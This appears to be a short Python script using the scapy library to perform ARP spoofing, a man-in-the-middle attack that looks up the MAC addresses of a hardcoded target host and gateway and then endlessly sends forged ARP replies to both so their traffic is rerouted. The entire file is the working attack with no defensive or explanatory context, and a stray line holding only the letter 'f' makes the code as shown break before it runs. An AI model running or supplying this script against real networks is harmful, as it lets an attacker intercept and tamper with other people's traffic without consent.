import scapy.all as scapy

def spoofing(ip_target, mac_target,spoof_ip):
    snoof_ARP_paket = scapy.ARP(pdst = ip_target,hwdst = mac_target,psrc = spoof_ip,op = 2)
    scapy.send(snoof_ARP_paket, verbose = 0)

def get_mac(ip):
    arp_request = scapy.Ether(dst = 'ff:ff:ff:ff:ff:ff')/scapy.ARP(pdst = ip)
    uns , s = scapy.srp(arp_request,timeout = 3,verbose = 0)
    if uns:
        return uns[0][1].src
    return None
f
defult_getway = "192.168.1.1"
target_ip = "192.168.1.108"

target_mac = None
while not target_mac:
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f'mac addres for {target_ip} not found')
print(f"target mac for>> {target_ip} is>> {target_mac} .")

mac_getway = None
while not mac_getway:
    mac_getway = get_mac(defult_getway)
    if not mac_getway: 
        print(f'mac addres for {defult_getway} not found')
print(f"target mac for>> {defult_getway} is>> {mac_getway} .")

while True:
    spoofing(ip_target = target_ip,mac_target = target_mac,spoof_ip = defult_getway)
    spoofing(ip_target = defult_getway,mac_target = mac_getway,spoof_ip = target_ip)
    print("spoofing")